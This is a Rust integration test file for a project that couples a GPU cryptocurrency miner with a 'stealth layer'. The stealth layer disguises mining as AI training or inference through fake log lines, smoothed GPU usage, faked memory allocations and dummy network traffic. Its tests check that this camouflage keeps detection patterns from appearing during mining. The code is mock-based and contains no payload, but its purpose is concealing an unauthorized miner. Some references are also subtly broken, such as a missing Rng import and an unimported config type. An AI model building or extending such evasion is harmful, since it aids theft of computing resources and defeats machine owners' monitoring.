//! # Phase 3.3 Stealth Layer + Mining Core Integration Tests
//!
//! Comprehensive integration tests validating stealth components work with mining core.
//! Tests GPU smoother + mining, camouflage disruption prevention, and concurrent operation.

use std::time::{Duration, Instant};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::RwLock;
use tokio::time::sleep;

use stealth_layer::{ProfileManager, StealthConfig, ProfileConfig, ResourceCamouflage};
use mining_core::{GpuManager, MiningConfig, GpuConfig};

// Mock GPU manager for integration testing
#[derive(Clone)]
struct MockGpuManager {
    utilization_history: Arc<RwLock<Vec<f32>>>,
    thermal_history: Arc<RwLock<Vec<f32>>>,
    memory_history: Arc<RwLock<Vec<u64>>>,
}

impl MockGpuManager {
    fn new() -> Self {
        Self {
            utilization_history: Arc::new(RwLock::new(Vec::new())),
            thermal_history: Arc::new(RwLock::new(Vec::new())),
            memory_history: Arc::new(RwLock::new(Vec::new())),
        }
    }

    async fn record_utilization(&self, utilization: f32) {
        self.utilization_history.write().await.push(utilization);
    }

    async fn get_average_utilization(&self) -> f32 {
        let history = self.utilization_history.read().await;
        if history.is_empty() {
            0.0
        } else {
            history.iter().sum::<f32>() / history.len() as f32
        }
    }

    async fn simulate_mining_workload(&self, target_utilization: f32, duration: Duration) {
        let start = Instant::now();
        let mut rng = rand::thread_rng();

        while start.elapsed() < duration {
            // Simulate mining GPU usage with realistic variance
            let base_usage = target_utilization;
            let noise = rng.gen_range(-0.08..0.12); // ±8-12% realistic noise
            let actual_usage = (base_usage + noise).clamp(0.0, 1.0);

            self.record_utilization(actual_usage).await;
            sleep(Duration::from_millis(50)).await; // 20Hz sampling rate
        }
    }
}

// Stealth integration validator
struct StealthIntegrationValidator {
    mock_gpu: MockGpuManager,
    stealth_patterns: HashMap<String, Vec<String>>,
}

impl StealthIntegrationValidator {
    fn new() -> Self {
        let mut stealth_patterns = HashMap::new();

        // Real patterns that should appear in logs
        stealth_patterns.insert("ai_training".to_string(), vec![
            "epoch=".to_string(),
            "batch=".to_string(),
            "loss=".to_string(),
            "Training progress".to_string(),
        ]);

        stealth_patterns.insert("ai_inference".to_string(), vec![
            "p50_ms=".to_string(),
            "p95_ms=".to_string(),
            "total_requests=".to_string(),
        ]);

        stealth_patterns.insert("image_processing".to_string(), vec![
            "Processing \\d+ images".to_string(),
            "batch=\\d+".to_string(),
            "throughput_imgs_per_sec=\\d+".to_string(),
        ]);

        Self {
            mock_gpu: MockGpuManager::new(),
            stealth_patterns,
        }
    }

    async fn validate_stealth_during_mining(&self,
        mining_duration: Duration,
        stealth_config: &StealthConfig
    ) -> Result<StealthIntegrationResult, String> {

        // Start mining simulation
        let mining_task = tokio::spawn({
            let mock_gpu = self.mock_gpu.clone();
            async move {
                mock_gpu.simulate_mining_workload(0.78, mining_duration).await;
            }
        });

        // Start stealth system
        let stealth_manager = ProfileManager::new(stealth_config.clone()).unwrap();
        stealth_manager.start().await.unwrap();

        // Allow both systems to run concurrently
        sleep(mining_duration).await;

        // Query stealth status during operation
        let stealth_status = stealth_manager.get_status().await;
        let gpu_utilization = self.mock_gpu.get_average_utilization().await;

        // Stop stealth system
        stealth_manager.stop().await.unwrap();

        // Wait for mining to complete
        mining_task.await.unwrap();

        // Validate integration results
        self.validate_integration_results(&stealth_status, gpu_utilization, &stealth_config)
    }

    fn validate_integration_results(&self,
        stealth_status: &HashMap<String, bool>,
        gpu_utilization: f32,
        stealth_config: &StealthConfig
    ) -> Result<StealthIntegrationResult, String> {

        let mut issues = Vec::new();

        // Check stealth profiles are active
        for (profile_name, enabled) in &stealth_config.enabled_profiles {
            if *enabled {
                if stealth_status.get(profile_name).copied().unwrap_or(false) {
                    // Profile is active as expected
                } else {
                    issues.push(format!("Profile {} not active during mining", profile_name));
                }
            }
        }

        // Validate GPU utilization is within expected range
        let expected_stealth_target = stealth_config.camouflage.gpu_target;
        let utilization_deviation = (gpu_utilization - expected_stealth_target).abs();

        if utilization_deviation > 0.15 { // ±15% tolerance
            issues.push(format!(
                "GPU utilization {:.2} too far from stealth target {:.2} (deviation: {:.2})",
                gpu_utilization, expected_stealth_target, utilization_deviation
            ));
        }

        // Check for minimum activity
        let total_profiles_active = stealth_status.values().filter(|&&active| active).count();
        if total_profiles_active == 0 {
            issues.push("No stealth profiles active during mining".to_string());
        }

        let success = issues.is_empty();

        Ok(StealthIntegrationResult {
            success,
            issues,
            active_profiles: total_profiles_active,
            gpu_utilization,
            mining_stealth_compatible: success,
        })
    }
}

#[derive(Debug)]
struct StealthIntegrationResult {
    success: bool,
    issues: Vec<String>,
    active_profiles: usize,
    gpu_utilization: f32,
    mining_stealth_compatible: bool,
}

// Camouflage disruption detector
struct CamouflageDisruptionDetector {
    baseline_patterns: HashMap<String, usize>,
    current_observations: HashMap<String, usize>,
}

impl CamouflageDisruptionDetector {
    fn new() -> Self {
        let mut baseline_patterns = HashMap::new();
        // Expected counts of certain patterns during normal mining with camouflage
        baseline_patterns.insert("gpu_measurements".to_string(), 1000); // Should have many readings
        baseline_patterns.insert("memory_allocations".to_string(), 20); // Periodic allocations
        baseline_patterns.insert("network_packets".to_string(), 50); // Dummy traffic
        baseline_patterns.insert("stealth_logs".to_string(), 15); // Background AI logs

        Self {
            baseline_patterns,
            current_observations: HashMap::new(),
        }
    }

    fn record_observation(&mut self, category: &str, count: usize) {
        *self.current_observations.entry(category.to_string()).or_insert(0) += count;
    }

    fn check_disruption(&self) -> Result<(), String> {
        let mut disruptions = Vec::new();

        for (category, baseline_count) in &self.baseline_patterns {
            let observed_count = self.current_observations.get(category).copied().unwrap_or(0);

            // Check if patterns are present (tolerance: ±50% of baseline)
            let min_expected = *baseline_count as f32 * 0.5;
            let max_expected = *baseline_count as f32 * 1.5;

            if (observed_count as f32) < min_expected || (observed_count as f32) > max_expected {
                disruptions.push(format!(
                    "Disruption in {}: observed {} (expected {:.0}-{:.0})",
                    category, observed_count, min_expected, max_expected
                ));
            }
        }

        if disruptions.is_empty() {
            Ok(())
        } else {
            Err(disruptions.join("; "))
        }
    }
}

#[cfg(test)]
mod stealth_integration_tests {
    use super::*;

    #[tokio::test]
    async fn phase33_stealth_mining_core_integration() {
        // Test: Stealth layer works correctly with mining core during active mining

        let validator = StealthIntegrationValidator::new();

        // Setup stealth configuration with realistic settings
        let stealth_config = StealthConfig {
            enabled_profiles: vec![
                ("ai_training".to_string(), true),
                ("ai_inference".to_string(), true),
                ("image_processing".to_string(), false), // Test mixed enabled/disabled
            ],
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(5),
                gpu_target: 0.82,
                total_epochs: 2,
            },
            ai_inference: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(3),
                gpu_target: 0.68,
                total_epochs: 0,
            },
            camouflage: Default::default(),
            ..Default::default()
        };

        let mining_duration = Duration::from_secs(15);

        // Run integrated stealth + mining test
        let result = validator.validate_stealth_during_mining(mining_duration, &stealth_config).await
            .expect("Stealth integration test failed");

        // Phase 3.3: Integration must be successful
        assert!(result.success, "CRITICAL FAILURE: Stealth + mining integration failed: {:?}",
                result.issues);

        // Validate specific requirements
        assert!(result.active_profiles >= 2, "Not enough stealth profiles active: {}", result.active_profiles);
        assert!(result.gpu_utilization > 0.6, "GPU utilization too low: {:.2}", result.gpu_utilization);
        assert!(result.gpu_utilization < 1.0, "GPU utilization too high: {:.2}", result.gpu_utilization);
        assert!(result.mining_stealth_compatible, "Mining and stealth not compatible");

        println!("✅ Phase 3.3 Validation: Stealth layer integrates successfully with mining core");
        println!("   Active profiles: {}, GPU utilization: {:.2}", result.active_profiles, result.gpu_utilization);
    }

    #[tokio::test]
    async fn phase33_camouflage_disruption_prevention() {
        // Test: Resource camouflage prevents detection patterns during mining

        let mut detector = CamouflageDisruptionDetector::new();

        // Simulate mining session with camouflage
        let camouflage_config = ResourceCamouflageConfig {
            gpu_smoother_enabled: true,
            gpu_smoother_alpha: 0.25,
            memory_faker_enabled: true,
            memory_faker_strategy: "periodic".to_string(),
            network_mixer_enabled: true,
            ..Default::default()
        };

        // Start camouflage monitoring
        let mock_gpu = MockGpuManager::new();
        let monitoring_task = tokio::spawn({
            let mock_gpu = mock_gpu.clone();
            async move {
                mock_gpu.simulate_mining_workload(0.75, Duration::from_secs(10)).await;
            }
        });

        // Simulate camouflage activities
        sleep(Duration::from_millis(500)).await;
        detector.record_observation("gpu_measurements", 200); // Should have GPU readings

        sleep(Duration::from_millis(500)).await;
        detector.record_observation("memory_allocations", 15); // Should have memory faking

        sleep(Duration::from_millis(500)).await;
        detector.record_observation("network_packets", 30); // Should have dummy traffic

        sleep(Duration::from_millis(500)).await;
        detector.record_observation("stealth_logs", 10); // Should have fake AI logs

        // Wait for monitoring to complete
        monitoring_task.await.unwrap();

        // Phase 3.3: No camouflage disruptions detected
        let disruption_check = detector.check_disruption();

        assert!(disruption_check.is_ok(), "CRITICAL FAILURE: Camouflage disruption detected: {}",
                disruption_check.unwrap_err());

        // Additional validation that camouflage is working
        let avg_gpu_usage = mock_gpu.get_average_utilization().await;
        assert!((avg_gpu_usage - 0.75).abs() < 0.10, "GPU usage not stabilized: {:.2}", avg_gpu_usage);

        println!("✅ Phase 3.3 Validation: Resource camouflage prevents detection patterns");
    }

    #[tokio::test]
    async fn phase33_stealth_resource_contention_test() {
        // Test: Stealth profiles don't interfere with mining performance

        let validator = StealthIntegrationValidator::new();

        // High-activity stealth configuration
        let stealth_config = StealthConfig {
            enabled_profiles: vec![
                ("ai_training".to_string(), true),
                ("ai_inference".to_string(), true),
                ("image_processing".to_string(), true),
                ("scientific".to_string(), true),
            ],
            ai_training: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(2), // High frequency
                gpu_target: 0.75,
                total_epochs: 10,
            },
            ai_inference: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(1), // Very high frequency
                gpu_target: 0.65,
                total_epochs: 0,
            },
            image_processing: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(3),
                gpu_target: 0.70,
                total_epochs: 0,
            },
            scientific: ProfileConfig {
                enabled: true,
                log_frequency: Duration::from_secs(2),
                gpu_target: 0.85,
                total_epochs: 0,
            },
            ..Default::default()
        };

        let mining_duration = Duration::from_secs(20);

        let result = validator.validate_stealth_during_mining(mining_duration, &stealth_config).await
            .expect("Resource contention test failed");

        // Phase 3.3: Stealth should not interfere with mining
        assert!(result.success, "Stealth caused mining interference: {:?}", result.issues);
        assert!(result.gpu_utilization > 0.5, "GPU utilization dropped too low: {:.2}", result.gpu_utilization);

        // All profiles should be active
        assert_eq!(result.active_profiles, 4, "Not all stealth profiles active: {}", result.active_profiles);

        println!("✅ Phase 3.3 Validation: Stealth does not interfere with mining performance");
    }

    #[tokio::test]
    async fn phase33_stealth_configuration_integration() {
        // Test: Stealth configuration properly integrates with mining configuration

        // Create mining configuration with stealth components enabled
        let mining_config = MiningConfig {
            gpu: GpuConfig {
                devices: vec![0, 1], // Multi-GPU setup
                threads_per_gpu: 4096,
            },
            ..Default::default()
        };

        let stealth_config = StealthConfig {
            enabled_profiles: vec![
                ("ai_training".to_string(), true),
                ("ai_inference".to_string(), true),
            ],
            camouflage: ResourceCamouflageConfig {
                gpu_smoother_enabled: true,
                memory_faker_enabled: true,
                network_mixer_enabled: true,
                ..Default::default()
            },
            ..Default::default()
        };

        // Integration test: Create combined configuration
        let mut integrated_config = HashMap::new();
        integrated_config.insert("mining".to_string(), serde_json::to_value(&mining_config).unwrap());
        integrated_config.insert("stealth".to_string(), serde_json::to_value(&stealth_config).unwrap());

        // Validate configuration compatibility
        let mining_val: MiningConfig = serde_json::from_value(integrated_config["mining"].clone()).unwrap();
        let stealth_val: StealthConfig = serde_json::from_value(integrated_config["stealth"].clone()).unwrap();

        // Phase 3.3: Configurations must be compatible
        assert!(mining_val.gpu.devices.len() >= 1, "Mining config has no GPUs");
        assert!(stealth_val.enabled_profiles.iter().any(|(_, enabled)| *enabled),
            "Stealth config has no enabled profiles");

        // Validate multi-GPU stealth handling
        let gpu_count = mining_val.gpu.devices.len();
        assert!(gpu_count <= 4, "Test environment limited to 4 GPUs, got {}", gpu_count);

        println!("✅ Phase 3.3 Validation: Stealth and mining configurations integrate properly");
    }

    #[tokio::test]
    async fn phase33_stealth_mining_lifecycle_coordination() {
        // Test: Stealth and mining lifecycle events are properly coordinated

        let validator = StealthIntegrationValidator::new();

        let stealth_config = StealthConfig {
            enabled_profiles: vec![("ai_training".to_string(), true)],
            ..Default::default()
        };

        // Test lifecycle coordination
        let test_duration = Duration::from_secs(25);

        let start_time = Instant::now();

        // Start mining simulation first
        let mining_task = tokio::spawn({
            let mock_gpu = validator.mock_gpu.clone();
            async move {
                mock_gpu.simulate_mining_workload(0.80, test_duration).await;
            }
        });

        // Start stealth after short delay (simulate startup sequencing)
        sleep(Duration::from_secs(2)).await;

        let stealth_manager = ProfileManager::new(stealth_config.clone()).unwrap();
        stealth_manager.start().await.unwrap();

        // Allow both to run
        sleep(test_duration - Duration::from_secs(5)).await;

        // Stop stealth before mining completes (simulate shutdown sequencing)
        stealth_manager.stop().await.unwrap();

        // Allow mining to complete
        mining_task.await.unwrap();

        let total_duration = start_time.elapsed();

        // Phase 3.3: Lifecycle coordination within reasonable time bounds
        assert!(total_duration >= test_duration, "Test completed too quickly");
        assert!(total_duration <= test_duration + Duration::from_secs(3), "Test took too long");

        // Validate final state
        let gpu_history = validator.mock_gpu.utilization_history.read().await;
        assert!(!gpu_history.is_empty(), "No GPU utilization data collected");

        let avg_utilization = gpu_history.iter().sum::<f32>() / gpu_history.len() as f32;
        assert!(avg_utilization > 0.7, "Average GPU utilization too low: {:.2}", avg_utilization);

        println!("✅ Phase 3.3 Validation: Stealth and mining lifecycle properly coordinated");
    }

    #[tokio::test]
    async fn phase33_stealth_performance_monitoring_integration() {
        // Test: Stealth integrates with mining performance monitoring

        let validator = StealthIntegrationValidator::new();

        let stealth_config = StealthConfig {
            enabled_profiles: vec![("ai_inference".to_string(), true)],
            camouflage: ResourceCamouflageConfig {
                gpu_smoother_enabled: true,
                memory_faker_enabled: true,
                ..Default::default()
            },
            ..Default::default()
        };

        // Run performance-affecting test
        let result = validator.validate_stealth_during_mining(Duration::from_secs(12), &stealth_config).await
            .expect("Performance monitoring test failed");

        assert!(result.success, "Performance monitoring integration failed");

        // Validate performance metrics collection
        assert!(result.active_profiles >= 1, "Performance monitoring profile not active");
        assert!(result.gpu_utilization > 0.0, "No GPU utilization measured");

        // Additional performance checks
        let gpu_history = validator.mock_gpu.utilization_history.read().await;
        let utilization_variance = calculate_variance(&gpu_history);
        assert!(utilization_variance < 0.05, "GPU utilization variance too high: {:.4}", utilization_variance);

        println!("✅ Phase 3.3 Validation: Stealth integrates correctly with performance monitoring");
    }

    fn calculate_variance(values: &[f32]) -> f32 {
        if values.is_empty() {
            return 0.0;
        }

        let mean = values.iter().sum::<f32>() / values.len() as f32;
        let variance = values.iter()
            .map(|v| (v - mean).powi(2))
            .sum::<f32>() / values.len() as f32;

        variance
    }
}